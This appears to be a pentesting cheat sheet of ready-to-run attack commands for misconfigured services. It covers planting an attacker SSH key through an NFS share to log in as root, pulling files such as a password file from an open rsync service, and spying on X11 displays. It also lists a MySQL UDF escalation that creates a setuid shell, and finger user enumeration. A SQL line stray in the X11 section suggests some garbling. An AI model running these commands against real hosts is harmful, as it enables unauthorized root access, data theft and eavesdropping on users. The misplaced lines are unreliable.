
### Insecure NFS Misconfiguration
NFS security is partially based on the remote user mounting the filesystem having the same UID (User ID) and GID (Group ID) as the owner of that share.
Restrictions can also be placed into the **/etc/hosts.allow and /etc/hosts.deny** files, but we won’t go into that here.
Suffice to say, using the UID and GID as a basis for security isn’t the best way of doing it
```
showmount -e 192.168.100.25 #Check if any share is available 
mount -t nfs 192.168.100.25:/home /tmp/NFS 
mount -t nfs 192.168.1.112:/ /mnt -o nolock 
mkdir -p /root/.ssh # We May Upload SSH Key to NFS 
ssh-keygen -t rsa -b 4096 
cp /root/.ssh/hacker_rsa.pub /mnt/root/.ssh/ 
cat authorized_keys 
cat id_rsa.pub >> authorized_keys 
ssh -i /root/.ssh/hacker_rsa root@192.168.1.112
```

### Insecure Rsync Service
```
rsync 192.168.1.171:: 
rsync 192.168.1.171::files 
rsync -r 192.168.1.171::files/tmp/ 
rsync 192.168.1.171::files/home/test/mypassword.txt 
rsync -r 192.168.1.171::files/home/test/ 
rsync ./myfile.txt 192.168.1.171::files/home/test 
rsync -r ./myfolder 192.168.1.171::files/home/test 
```

### X 11  Common Vulnerability

```
nmap -p 6000 --script=x11-access 192.168.2.26,75 
create table npn(line blob); 
xdpyinfo -display 192.168.2.75:0 | head -n 5 
xspy -display 192.168.1.23:0 -delay 100 
```

### MySQL Privilge Escalation Through UDF
```
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
use mysql; 
create table npn(line blob); 
insert into npn values(load_file('/tmp/raptor_udf2.so')); 
select * from npn into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so'; 
select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell'); 
```
# Finger User Enumeration
```
finger admin@192.186.218.3
finger 0@host 
auxiliary/scanner/finger/finger_users 
```
